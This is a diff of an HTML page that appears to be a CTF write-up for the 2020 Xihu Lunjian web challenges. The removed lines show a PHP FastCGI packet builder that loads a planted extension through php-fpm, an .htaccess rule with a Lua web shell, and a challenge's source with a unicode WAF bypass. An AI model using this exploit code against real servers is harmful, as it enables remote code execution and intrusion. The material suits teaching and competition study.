-    <span class="k">protected</span> <span class="nv">$_requests</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-    <span class="k">protected</span> <span class="nv">$_requestCounter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="k">protected</span> <span class="k">function</span> <span class="nf">buildPacket</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$requestId</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="nv">$totLen</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
-        <span class="nv">$buf</span>    <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-        <span class="k">do</span> <span class="p">{</span>
-            <span class="c1">// Packets can be a maximum of 65535 bytes</span>
-            <span class="nv">$part</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">,</span> <span class="mh">0xffff</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
-            <span class="nv">$segLen</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$part</span><span class="p">);</span>
-            <span class="nv">$buf</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">VERSION_1</span><span class="p">)</span>        <span class="cm">/* version */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>                    <span class="cm">/* type */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$requestId</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="cm">/* requestIdB1 */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$requestId</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>        <span class="cm">/* requestIdB0 */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$segLen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>    <span class="cm">/* contentLengthB1 */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$segLen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>           <span class="cm">/* contentLengthB0 */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* paddingLength */</span>
-                <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* reserved */</span>
-                <span class="o">.</span> <span class="nv">$part</span><span class="p">;</span>                        <span class="cm">/* content */</span>
-            <span class="nv">$offset</span> <span class="o">+=</span> <span class="nv">$segLen</span><span class="p">;</span>
-        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$offset</span> <span class="o">&lt;</span> <span class="nv">$totLen</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$buf</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">protected</span> <span class="k">function</span> <span class="nf">buildNvpair</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$nlen</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
-        <span class="nv">$vlen</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
-            <span class="cm">/* nameLengthB0 */</span>
-            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$nlen</span><span class="p">);</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="cm">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
-            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
-            <span class="cm">/* valueLengthB0 */</span>
-            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$vlen</span><span class="p">);</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="cm">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
-            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$vlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="cm">/* nameData &amp; valueData */</span>
-        <span class="k">return</span> <span class="nv">$nvpair</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="nv">$value</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">protected</span> <span class="k">function</span> <span class="nf">readNvpair</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$length</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$length</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$length</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-        <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="k">while</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">!=</span> <span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$nlen</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$nlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
-                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
-                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
-                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
-            <span class="p">}</span>
-            <span class="nv">$vlen</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$vlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
-                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
-                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
-                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
-            <span class="p">}</span>
-            <span class="nv">$array</span><span class="p">[</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$nlen</span><span class="p">)]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="o">+</span><span class="nv">$nlen</span><span class="p">,</span> <span class="nv">$vlen</span><span class="p">);</span>
-            <span class="nv">$p</span> <span class="o">+=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">+</span> <span class="nv">$vlen</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">buildAllPacket</span><span class="p">(</span><span class="k">array</span> <span class="nv">$params</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="c1">// Ensure new requestID is not already being tracked</span>
-        <span class="k">do</span> <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_requestCounter</span><span class="o">++</span><span class="p">;</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_requestCounter</span> <span class="o">&gt;=</span> <span class="mi">65536</span> <span class="cm">/* or (1 &lt;&lt; 16) */</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_requestCounter</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-            <span class="p">}</span>
-            <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_requestCounter</span><span class="p">;</span>
-        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_requests</span><span class="p">[</span><span class="nv">$id</span><span class="p">]));</span>
-        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">BEGIN_REQUEST</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">RESPONDER</span><span class="p">)</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">keepAlive</span><span class="p">)</span> <span class="o">.</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">5</span><span class="p">),</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="nv">$paramsRequest</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$paramsRequest</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildNvpair</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$paramsRequest</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="nv">$paramsRequest</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$stdin</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$request</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">stream_socket_client</span><span class="p">(</span><span class="s2">&quot;unix:///tmp/php-cgi-74.sock&quot;</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">);</span>
-<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Client</span><span class="p">();</span>
-<span class="nv">$payload_file</span> <span class="o">=</span> <span class="s2">&quot;/tmp/jylsec.php&quot;</span><span class="p">;</span>
-<span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-    <span class="s1">&#39;REQUEST_METHOD&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
-    <span class="s1">&#39;SCRIPT_FILENAME&#39;</span> <span class="o">=&gt;</span> <span class="nv">$payload_file</span><span class="p">,</span>
-    <span class="s1">&#39;PHP_ADMIN_VALUE&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;extension_dir = /tmp</span><span class="se">\n</span><span class="s2">extension = jylsec.so&quot;</span><span class="p">,</span>
-<span class="p">);</span>
-<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">buildAllPacket</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
-<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-<span class="nb">var_dump</span><span class="p">(</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">4096</span><span class="p">));</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</code></pre></div>
-<a href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></p>
-<h3 id="lua">利用lua<a class="headerlink" href="#lua" title="Permanent link">&para;</a></h3>
-<p><a href="https://xz.aliyun.com/t/6088">https://xz.aliyun.com/t/6088</a>  </p>
-<p>bt默认安装了一个lua 模块</p>
-<p>上传<code>.htaccess</code>
-<div class="highlight"><pre><span></span><code>AddHandler lua-script .lua
-</code></pre></div></p>
-<p>上传shel.lua
-<div class="highlight"><pre><span></span><code><span class="nb">require</span> <span class="s2">&quot;string&quot;</span>
-
-<span class="kr">function</span> <span class="nf">handle</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-    <span class="n">r</span><span class="p">.</span><span class="n">content_type</span> <span class="o">=</span> <span class="s2">&quot;text/plain&quot;</span>
-    <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s1">&#39;/readflag&#39;</span><span class="p">)</span>
-    <span class="kd">local</span> <span class="n">a</span> <span class="o">=</span> <span class="n">t</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;*all&quot;</span><span class="p">)</span>
-    <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-
-    <span class="kr">if</span> <span class="n">r</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="kr">then</span>
-        <span class="kr">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="kr">in</span> <span class="nb">pairs</span><span class="p">(</span> <span class="n">r</span><span class="p">:</span><span class="n">parseargs</span><span class="p">()</span> <span class="p">)</span> <span class="kr">do</span>
-            <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">&quot;%s: %s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="p">)</span>
-        <span class="kr">end</span>
-    <span class="kr">else</span>
-        <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Unsupported HTTP method &quot;</span> <span class="o">..</span> <span class="n">r</span><span class="p">.</span><span class="n">method</span><span class="p">)</span>
-    <span class="kr">end</span>
-<span class="kr">end</span>
-</code></pre></div></p>
-<h2 id="web5">Web5<a class="headerlink" href="#web5" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="k">include</span> <span class="s1">&#39;security.php&#39;</span><span class="p">;</span>
-
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
-    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-<span class="p">}</span>
-<span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span><span class="o">.</span><span class="nb">sha1</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
-<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">)){</span>
-    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="s2">&quot;index.php&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
-<span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;php://input&quot;</span><span class="p">);</span>
-
-
-<span class="k">if</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&quot;write&quot;</span> <span class="o">&amp;&amp;</span>  <span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span><span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">)){</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
-    <span class="nv">$filecontent</span> <span class="o">=</span> <span class="nv">$content</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
-    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$filecontent</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2"> Powered By Dbapp OSS.&quot;</span><span class="p">);</span>
-<span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&quot;reset&quot;</span><span class="p">){</span>
-    <span class="nv">$files</span> <span class="o">=</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&quot;index.php&quot;</span><span class="p">){</span>
-                <span class="nb">unlink</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">else</span><span class="p">{</span>
-    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Security Check Failed.&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>waf了一些参数，利用unicode编码绕过</p>
-<div class="highlight"><pre><span></span><code>POST http://easyjson.8a3da2.challenge.gcsis.cn/?source&amp;action=write&amp;filename=c.php HTTP/1.1
+<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=https://github.com/eggdkk/Web_Learning/CTF_Writeup/2020xhlj/ rel=canonical><meta name=author content=dkk><link rel="shortcut icon" href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.1.2, mkdocs-material-5.4.0"><title>2020西湖论剑初赛 - Web learning</title><link rel=stylesheet href=../../assets/stylesheets/main.fe0cca5b.min.css><link rel=stylesheet href=../../css/extension.css><link rel=stylesheet href=../../css/simpleLightbox.scss></head> <body dir=ltr> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#2020 class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header-nav md-grid" aria-label=Header> <a href=https://github.com/eggdkk/Web_Learning title="Web learning" class="md-header-nav__button md-logo" aria-label="Web learning"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> <label class="md-header-nav__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header-nav__title data-md-component=header-title> <div class=md-header-nav__ellipsis> <span class="md-header-nav__topic md-ellipsis"> Web learning </span> <span class="md-header-nav__topic md-ellipsis"> 2020西湖论剑初赛 </span> </div> </div> <label class="md-header-nav__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header-nav__source> <a href=https://github.com/eggdkk/Web_Learning/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg> </div> <div class=md-source__repository> eggdkk/Web_Learning </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div 